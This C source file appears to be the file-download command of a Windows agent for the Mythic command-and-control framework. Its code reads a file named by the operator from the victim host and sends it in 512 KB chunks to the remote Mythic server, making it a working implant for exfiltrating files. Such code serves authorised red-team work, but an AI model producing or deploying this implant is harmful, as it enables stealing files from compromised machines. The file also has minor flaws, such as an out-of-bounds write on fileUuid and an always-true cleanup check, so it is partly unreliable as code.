#include "Tasks/Download.h"

#include <windows.h>
#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_DOWNLOAD

#define CHUNK_SIZE  512000      // 512 KB

/**
 * @brief Initialize a file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD DownloadInit(_In_ PCHAR taskUuid, _Inout_ FILE_DOWNLOAD* download)
{
    DWORD Status = 0;

    if (!GetFileSizeEx(download->hFile, &download->fileSize))
    {
        DWORD error = GetLastError();
        _err("Error getting file size of %s : ERROR CODE %d", download->filepath, error);
        Status = error;
        goto end;
    }

    // Calculate total chunks (rounded up)
    download->totalChunks = (DWORD)((download->fileSize.QuadPart + CHUNK_SIZE - 1) / CHUNK_SIZE);

    /*
        TODO - Handle current directory or full path to file
        Not too sure on how to do this yet...
    */

    // Prepare package
    PPackage data = PackageInit(DOWNLOAD_INIT, TRUE);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt32(data, download->totalChunks);
    PackageAddString(data, download->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);

    // Send package
    PARSER Response = { 0 };
    PackageSend(data, &Response);

    BYTE status = ParserGetByte(&Response);
    if (status == FALSE)
    {
        _err("DownloadInit returned failure status : 0x%hhx", status);
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    SIZE_T lenUuid  = TASK_UUID_SIZE;
    PCHAR uuid = ParserGetString(&Response, &lenUuid);
    if (uuid == NULL) 
    {
        _err("Failed to get UUID from response.");
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
    download->fileUuid[TASK_UUID_SIZE + 1] = '\0';    // null-termination

end:
    // Cleanup
    if (data) PackageDestroy(data);
    if (&Response) ParserDestroy(&Response);

    return Status;
}

/**
 * @brief Send b64 chunks of a file to Mythic server
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD DownloadContinue(_In_ PCHAR taskUuid, _Inout_ FILE_DOWNLOAD* download)
{
    DWORD Status = 0;
    char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

    if (!chunkBuffer)
    {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        goto cleanup;
    }

    download->currentChunk = 1;

    while (download->currentChunk <= download->totalChunks)
    {
        DWORD bytesRead = 0;
        if (!ReadFile(download->hFile, chunkBuffer, CHUNK_SIZE, &bytesRead, NULL))
        {
            DWORD error = GetLastError();
            _err("Error reading file: ERROR CODE: %d", error);
            Status = error;
            goto cleanup;
        }

        _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);

        // Prepare package
        PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
        PackageAddString(cur, taskUuid, FALSE);
        PackageAddInt32(cur, download->currentChunk);
        PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddBytes(cur, chunkBuffer, bytesRead, TRUE);
        PackageAddInt32(cur, bytesRead);

        // Send chunk
        PARSER Response = { 0 };
        PackageSend(cur, &Response);

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE)
        {
            _err("Download chunk %d failed.", download->currentChunk);
            Status = ERROR_MYTHIC_DOWNLOAD;
            PackageDestroy(cur);
            ParserDestroy(&Response);
            goto cleanup;
        }

        download->currentChunk++;

        PackageDestroy(cur);
        ParserDestroy(&Response);
    }

cleanup:
    if (chunkBuffer) LocalFree(chunkBuffer);

    return Status;
}

/**
 * @brief Main command function for downloading a file from agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID Download(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{    
    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T pathLen      = 0;
    DWORD status;
    FILE_DOWNLOAD fd    = { 0 };

    PCHAR filepath      = ParserGetString(arguments, &pathLen);

    fd.hFile = CreateFileA(filepath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fd.hFile == INVALID_HANDLE_VALUE)
    {
        DWORD error = GetLastError();
        _err("Error opening file %s : ERROR CODE %d", filepath, error);
        PackageError(taskUuid, error);
        goto end;
    }

    strncpy(fd.filepath, filepath, pathLen);

    // Prepare to send
    status = DownloadInit(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    _dbg("Downloading FilePath:\"%s\" - ID:%s", fd.filepath, fd.fileUuid);

    // Transfer chunked file
    status = DownloadContinue(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    PackageComplete(taskUuid, NULL);

end:
    // Cleanup
    if (fd.hFile) CloseHandle(fd.hFile);
}

/**
 * @brief Thread entrypoint for Download function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI DownloadThread(_In_ LPVOID lpTaskParamter)
{
    _dbg("Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    Download(tp->TaskUuid, tp->TaskParser);
    
    _dbg("Download Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}



#endif  //INCLUDE_CMD_DOWNLOAD